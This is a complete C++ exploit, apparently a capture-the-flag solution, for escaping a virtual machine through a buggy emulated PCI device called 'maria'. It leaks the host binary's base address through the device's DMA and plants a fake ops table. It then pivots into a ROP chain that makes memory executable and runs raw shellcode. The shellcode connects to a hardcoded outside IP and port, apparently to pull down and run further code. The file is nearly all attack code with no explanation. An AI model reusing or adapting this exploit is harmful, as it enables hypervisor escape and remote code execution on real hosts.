#include <fcntl.h>
#include <inttypes.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include <map>

#define PAGE_SHIFT 12
#define PAGE_SIZE (1 << PAGE_SHIFT)
#define PAGE_PRESENT (1ull << 63)
#define PFN_MASK ((1ull << 55) - 1)
#define MARIA_MMIO_SIZE 0x10000

#define CHECK(condition)                                              \
  do {                                                                \
    if (!(condition)) {                                               \
      CheckFailure("Check failed at %s:%d: %s\n", __FILE__, __LINE__, \
                   #condition);                                       \
    }                                                                 \
  } while (0);

#define PCHECK(condition)                                                  \
  do {                                                                     \
    if (!(condition)) {                                                    \
      CheckFailure("Check failed at %s:%d (%m): %s\n", __FILE__, __LINE__, \
                   #condition);                                            \
    }                                                                      \
  } while (0);

void CheckFailure(const char* format, ...) {
  // asm("int3");
  va_list ap;
  va_start(ap, format);
  vfprintf(stderr, format, ap);
  va_end(ap);
  abort();
}

template <class Tp>
inline void DoNotOptimize(Tp& value) {
  asm volatile("" : "+r,m"(value) : : "memory");
}

int pagemap_fd;

struct mmio {
  uint32_t rw;
  uint32_t src;
  uint32_t off;
};

volatile struct mmio* mmio;

uintptr_t va_to_pa(void* va) {
  uintptr_t pg = (uintptr_t)va / PAGE_SIZE;
  uint64_t pagemap_entry;
  PCHECK(pread(pagemap_fd, &pagemap_entry, sizeof(pagemap_entry),
               pg * sizeof(pagemap_entry)) == sizeof(pagemap_entry));
  if (!(pagemap_entry & PAGE_PRESENT)) {
    return -1;
  }
  const uintptr_t pfn = pagemap_entry & PFN_MASK;
  const uintptr_t page_offset = (uintptr_t)va & ((1 << PAGE_SHIFT) - 1);
  return pfn * PAGE_SIZE + page_offset;
}

uint8_t* CombinePages(void* first, void* second) {
  uint8_t* addr = reinterpret_cast<uint8_t*>(
      mmap(NULL, PAGE_SIZE * 2, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0));
  PCHECK(addr != MAP_FAILED);
  PCHECK(mremap(first, PAGE_SIZE, PAGE_SIZE, MREMAP_MAYMOVE | MREMAP_FIXED,
                addr) == addr);
  PCHECK(mremap(second, PAGE_SIZE, PAGE_SIZE, MREMAP_MAYMOVE | MREMAP_FIXED,
                addr + PAGE_SIZE) == addr + PAGE_SIZE);
  return addr;
}

uint8_t* AllocateTwoContiguousPages() {
  std::map<uintptr_t, void*> phys_to_virt;
  while (true) {
    void* buf = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    PCHECK(buf != MAP_FAILED);
    PCHECK(mlock(buf, PAGE_SIZE) == 0);
    uintptr_t pa = va_to_pa(buf);

    auto it = phys_to_virt.find(pa + PAGE_SIZE);
    if (it != phys_to_virt.end()) {
      return CombinePages(buf, it->second);
    }

    it = phys_to_virt.find(pa - PAGE_SIZE);
    if (it != phys_to_virt.end()) {
      return CombinePages(it->second, buf);
    }

    phys_to_virt[pa] = buf;
  }
}

int main(int argc, char** argv) {
  pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
  PCHECK(pagemap_fd != -1);

  int mmio_fd =
      open("/sys/devices/pci0000:00/0000:00:05.0/resource0", O_RDWR | O_SYNC);
  PCHECK(mmio_fd != -1);

  mmio = reinterpret_cast<volatile struct mmio*>(mmap(
      NULL, MARIA_MMIO_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0));
  PCHECK(mmio != MAP_FAILED);

  uint8_t* buf = AllocateTwoContiguousPages();

  const uintptr_t pa = va_to_pa(buf);
  printf("%p -> 0x%" PRIxPTR "\n", buf, pa);
  CHECK(va_to_pa(buf + PAGE_SIZE) == pa + PAGE_SIZE);

  mmio->src = pa;
  mmio->off = 0xf0;
  CHECK(mmio->rw == 0x600DC0DE);

  uintptr_t maria_state = *reinterpret_cast<uint64_t*>(&buf[8032]);

  uintptr_t maria_mmio_ops = *reinterpret_cast<uint64_t*>(&buf[8024]);
  uintptr_t binary_base = maria_mmio_ops - 0xf1ff80;

  printf("maria_state = 0x%" PRIxPTR "\n", maria_state);
  printf("binary base = 0x%" PRIxPTR "\n", binary_base);

  // 0x00000000007bce54 : push rax ; pop rsp ; nop ; pop rbp ; ret
  uintptr_t stack_pivot_gadget = binary_base + 0x7bce54;

  // 0x000000000036035d : add rsp, 0x40 ; pop rbx ; pop r12 ; pop rbp ; ret
  uintptr_t add_rsp_0x58_ret = binary_base + 0x36035d;

  uintptr_t pop_rdi_ret = binary_base + 0x632c5d;
  uintptr_t pop_rsi_ret = binary_base + 0x4d4db3;
  uintptr_t pop_rdx_ret = binary_base + 0x47f5c8;
  uintptr_t mprotect = binary_base + 0x30C400;

  uintptr_t maria_state_buff = maria_state + 0xa30;
  uintptr_t fake_ops = maria_state_buff + 0xf0;
  uintptr_t shellcode_addr = fake_ops + 0x100;

  *reinterpret_cast<uint64_t*>(&buf[0]) = stack_pivot_gadget;
  auto* rop = reinterpret_cast<uint64_t*>(&buf[8]);

  int i = 0;
  rop[i++] = add_rsp_0x58_ret;
  i += 0x58 / 8;
  rop[i++] = pop_rdi_ret;
  rop[i++] = shellcode_addr & ~(PAGE_SIZE - 1);
  rop[i++] = pop_rsi_ret;
  rop[i++] = 0x2000;
  rop[i++] = pop_rdx_ret;
  rop[i++] = 7;
  rop[i++] = mprotect;
  rop[i++] = shellcode_addr;
  rop[i++] = 0xdeadc0de;

  constexpr uint8_t kShellcode[] =
      "\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05"
      "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68"
      "\x22\xa8\x9c\x80"  // host
      "\x66\x68"
      "\x15\xb3"  // port
      "\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff"
      "\x41\xff\xe7";
  memcpy(&buf[0x100], kShellcode, sizeof(kShellcode));

  *reinterpret_cast<uint64_t*>(&buf[8024]) = fake_ops;
  *reinterpret_cast<uint64_t*>(&buf[8032]) = fake_ops;

  DoNotOptimize(buf);
  mmio->rw = 1;

  CHECK(mmio->rw);
  return 0;
}
